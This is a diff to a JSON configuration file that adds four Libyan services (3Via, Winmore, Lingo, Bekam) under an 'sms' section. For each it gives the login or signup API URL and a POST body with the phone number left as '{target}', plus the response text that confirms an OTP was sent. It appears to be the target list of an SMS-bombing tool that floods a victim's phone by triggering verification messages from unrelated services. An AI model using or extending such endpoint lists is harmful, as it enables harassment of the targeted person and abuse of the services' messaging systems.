@@ -7,6 +7,49 @@
     "version": "2.3.5",
     "sms": {
 
+        "218": [
+            {
+                "name": "3Via",
+                "method": "POST",
+                "url": "https://3via.ly/api/client/login",
+                "data": {
+                    "msisdn": "{target}",
+                    "device_type": "web"
+                },
+                "identifier": "Otp Sent successfully"
+            },
+            {
+                "name": "Winmore",
+                "method": "POST",
+                "url": "https://winmore.ly/api/p10/public/get_started",
+                "data": {
+                    "phone": "{target}",
+                    "countryCode": "ly",
+                    "language": "en",
+                    "utm": {}
+                },
+                "identifier": "SUBSCRIBED"
+            },
+            {
+                "name": "Lingo",
+                "method": "POST",
+                "url": "https://lingo.ly/api/client/login",
+                "data": {
+                    "msisdn": "{target}"
+                },
+                "identifier": "OTP Sended successfully"
+            },
+            {
+                "name": "Bekam",
+                "method": "POST",
+                "url": "https://bekam.ly/api/client/login",
+                "data": {
+                    "msisdn": "{target}"
+                },
+                "identifier": "OTP Send Successfully"
+            }
+        ],
+
         "977":[
             {
                 "name":"Daraz Nepal",
